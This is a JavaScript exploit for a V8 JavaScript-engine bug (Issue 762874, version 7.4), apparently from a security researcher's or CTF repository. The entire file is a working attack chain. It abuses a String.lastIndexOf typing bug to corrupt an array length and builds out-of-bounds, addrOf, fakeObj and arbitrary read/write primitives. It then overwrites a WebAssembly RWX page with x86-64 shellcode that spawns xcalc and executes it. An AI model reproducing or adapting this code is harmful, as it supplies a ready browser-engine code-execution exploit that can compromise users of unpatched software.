/*************************************************************
 * File Name: newExp.js
 * 
 * Created on: 2020-03-09 04:44:37
 * Author: raycp
 * 
 * Last Modified: 2020-03-09 06:11:49
 * Description: exp for Issue 762874, on version 7.4
************************************************************/

const MAX_ITERATIONS = 100000;
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return i.toString(16).padStart(16, "0");
}

function wasm_func() {
    var wasmImports = {
        env: {
            puts: function puts (index) {
                print(utf8ToString(h, index));
            }
        }
    };
    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
        96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
        116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
        131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
        109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
        128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
        65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
    let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
    let h = new Uint8Array(m.exports.memory.buffer);
    return m.exports.hello;
}
function gc()
{
    for(let i=0;i<0x10;i++)
    {
        new Array(0x1000000);
    }
}


func = wasm_func();

//%DebugPrint(func);
//%SystemBreak();

const maxLength = 1073741799 //%StringMaxLength();
const s = 'A'.repeat(maxLength);
const maxSize = 1028*8;
//print(i2f(0x202000000000));
var oobArray;
var obj;
var dataBuf;
function foo() {

    let idx  = s.lastIndexOf("", maxLength);
    idx += 25;
    idx = idx >>30;
    idx = idx * 7;
    let arr = [1.1, 2.2, 3.3, 4.4];
    arr[idx] = 1.74512933848984e-310;   // overwrite the length
    let buf =  new ArrayBuffer(0x200);
    let o = {m:i2f(0xdeadbeef), n:func};
    return [arr, buf, o];
}

function buildOOBArray() 
{
    let ret = undefined;
    for(let i=0; i<MAX_ITERATIONS; i++)
    {
        ret = foo();
        if(ret[0].length != 4 && ret[0].length != 8)
            break;

    }
    return ret;

}

// build oob array here
var ret = buildOOBArray();
oobArray = ret[0];
obj = ret[2];
dataBuf = ret[1];

// trigger gc
gc();
gc();
print("[+] now oobArray length: "+oobArray.length);
//%DebugPrint(dataBuf[0]);
//%DebugPrint(obj);

// looking for obj element offset 
var floatObjectIdx = 0;
for(let i=0; i<maxSize; i++) {
    if(f2i(oobArray[i]) == 0xdeadbeef) {
        floatObjectIdx = i + 1;
        print("[+] float idx of object is: 0x"+hex(floatObjectIdx));
        break;
    }
} 

// looking for backing_stroe in data_buf
var floatArrayBufIdx = 0;
for(let i=0; i<maxSize; i++) {
    if(f2i(oobArray[i]) == 0x200) {

        floatArrayBufIdx = i + 1;
        print("[+] float idx of array buf backing store is: 0x"+hex(floatArrayBufIdx));
        break;
    }
}

var dataView = new DataView(dataBuf);

// build addrOf primitive 
function addrOf(objPara)
{
    obj.n=objPara;
    return f2i(oobArray[floatObjectIdx]) - 1;
}

// build fakeObj primitive
function fakeObj(fakeObjAddr)
{
    oobArray[floatObjectIdx] = i2f(fakeObjAddr);
    return obj.n;
}

// build aar primitive
function dataview_read64(addr)
{
    oobArray[floatArrayBufIdx]=i2f(addr);
    return f2i(dataView.getFloat64(0, true));
}

// build aaw primitive
function dataview_write64(addr, value)
{
    oobArray[floatArrayBufIdx] = i2f(addr);
    return dataView.setFloat64(0, f2i(value), True);
}

function dataview_write(addr, payload)
{
    oobArray[floatArrayBufIdx] = i2f(addr);
    for(let i=0; i<payload.length; i++) {
        dataView.setUint8(i, payload[i]);
    }
    return ;
}

// get the JSFunction addr with addrOf primitive
var wasmObjAddr = addrOf(func);
var sharedInfoAddr = dataview_read64(wasmObjAddr+0x18)-1;
var wasmExportedFunctionDataAddr = dataview_read64(sharedInfoAddr+8)-1;
var instanceAddr = dataview_read64(wasmExportedFunctionDataAddr+0x10)-1;
var rwxAddr = (dataview_read64(instanceAddr+0x100));

print("[+] wasm obj addr: 0x"+hex(wasmObjAddr));
print("[+] wasm shared info addr: 0x"+hex(sharedInfoAddr));
print("[+] wasmExportedFunctionData addr addr: 0x"+hex(wasmExportedFunctionDataAddr));
print("[+] instance  addr: 0x"+hex(instanceAddr));
print("[+] rwx addr: 0x"+hex(rwxAddr));

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
// wite the shellcode to wasm code
dataview_write(rwxAddr, shellcode);
// trigger wasm code and execute shellcode
func();


